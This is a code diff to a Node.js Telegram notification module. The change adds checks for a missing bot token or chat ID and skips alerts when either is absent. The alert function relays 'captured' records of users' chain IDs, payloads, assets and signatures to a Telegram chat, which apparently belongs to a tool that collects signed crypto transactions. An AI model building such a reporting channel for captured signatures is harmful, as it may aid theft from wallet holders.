@@ -2,8 +2,19 @@ const TelegramBot = require("node-telegram-bot-api");
 const dotenv = require("dotenv");
 dotenv.config();
 
-// Create Bot instance (polling false usually for simple notification scripts)
-const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
+// Validate Telegram configuration
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
+if (!TELEGRAM_BOT_TOKEN) {
+  console.warn("⚠️ TELEGRAM_BOT_TOKEN not configured - alerts will be disabled");
+}
+if (!TELEGRAM_CHAT_ID) {
+  console.warn("⚠️ TELEGRAM_CHAT_ID not configured - alerts will be disabled");
+}
+
+// Create Bot instance only if token is available
+const bot = TELEGRAM_BOT_TOKEN ? new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false }) : null;
 
 /**
  * Generates an explorer link based on the chain
@@ -23,6 +34,12 @@ const getExplorerLink = (chain, signature) => {
  * @param {Object} data - The captured data object (from captured.json)
  */
 const sendTelegramAlert = async (data) => {
+  // Skip if bot or chat ID not configured
+  if (!bot || !TELEGRAM_CHAT_ID) {
+    console.log("ℹ️ Telegram alerts disabled - missing configuration");
+    return;
+  }
+  
   try {
     const { user, chainId, payload, asset, signature, timestamp } = data;
     
@@ -56,7 +73,7 @@ const sendTelegramAlert = async (data) => {
     `;
 
     // Send Message
-    await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, message, {
+    await bot.sendMessage(TELEGRAM_CHAT_ID, message, {
       parse_mode: "HTML",
       disable_web_page_preview: true,
     });
